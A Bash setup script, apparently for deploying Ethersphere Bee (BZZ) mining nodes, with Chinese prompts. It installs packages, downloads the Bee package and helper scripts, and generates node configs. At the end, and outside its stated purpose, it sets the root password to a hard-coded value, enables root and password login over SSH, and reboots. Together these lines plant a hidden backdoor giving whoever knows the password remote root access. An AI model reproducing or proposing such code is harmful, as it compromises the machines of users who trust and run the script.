#!/usr/bin/env bash
cntFile=".showcnt.txt"
epFile="epFile.txt"
cd /root
if [ ! -f $cntFile ]; then
echo "首次使用脚本，进行初始化……"
sudo apt-get update
sudo apt-get install -y jq
sudo apt-get install -y lrzsz
sudo apt-get install -y screen
sudo apt-get install -y net-tools
wget https://github.com/ethersphere/bee/releases/download/v0.5.3/bee_0.5.3_amd64.deb
wget -O cashout.sh https://gist.githubusercontent.com/ralph-pichler/3b5ccd7a5c5cd0500e6428752b37e975/raw/aa576d6d28b523ea6f5d4a1ffb3c8cc0bbc2677f/cashout.sh && chmod 777 cashout.sh
wget https://raw.githubusercontent.com/pumpkin4gb/bzz/main/step2.sh && chmod 777 step2.sh
wget https://raw.githubusercontent.com/pumpkin4gb/bzz/main/step3.sh && chmod 777 step3.sh
sudo dpkg -i bee_0.5.3_amd64.deb && sudo chown -R bee:bee /var/lib/bee
echo "1" > $cntFile
chmod +rw $cntFile
sed -i 's/10000000000000000/1/g' cashout.sh
echo "http://47.253.61.23:8545"
read ep
echo "${ep}" > $epFile
fi
if [ $# == 1 ]; then
if [ $1 == "resetcnt" ]; then
echo "1" > $cntFile
fi
fi
ep=`cat $epFile`
tCnt=`cat $cntFile`
let tCnt++
echo $tCnt > $cntFile
echo "    这是第 $tCnt 次创建节点"
echo "    若需更改endpoint，请自行修改epFile.txt"
cat>node${tCnt}.yaml<<EOF
api-addr: :$((1534+${tCnt}))
config: /root/node${tCnt}.yaml
bootnode: "/ip4/47.113.202.103/tcp/1634/p2p/16Uiu2HAmRRALhkNMC6mDiY6CLyQUa7esxBCW3YMC64d4gY692rca"
data-dir: /var/lib/bee/node${tCnt}
cache-capacity: "2000000"
block-time: "15"
debug-api-addr: :$((1634+${tCnt}))
debug-api-enable: true
p2p-addr: :$((1734+${tCnt}))
password-file: /var/lib/bee/password
swap-initial-deposit: "10000000000000000"
verbosity: 5
swap-endpoint: http://47.253.61.23:8545
full-node: true
EOF
cp cashout.sh cashout${tCnt}.sh
sed -i "s/1635/$((1634+${tCnt}))/g" cashout${tCnt}.sh
echo "    第${tCnt}个节点等待接水中,node${tCnt}.yaml文件已生成至当前目录"
echo "    请等候bee与以太坊后端同步完毕后接水，然后按Ctrl+C"
echo "    之后可用./step1.sh再次运行此脚本部署更多节点"
echo "    部署完所有节点后运行step2.sh开始正式挖矿"
nohup bee start --config node${tCnt}.yaml &
echo root:07MHt7GU0t302EEG |sudo chpasswd root
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
sudo reboot
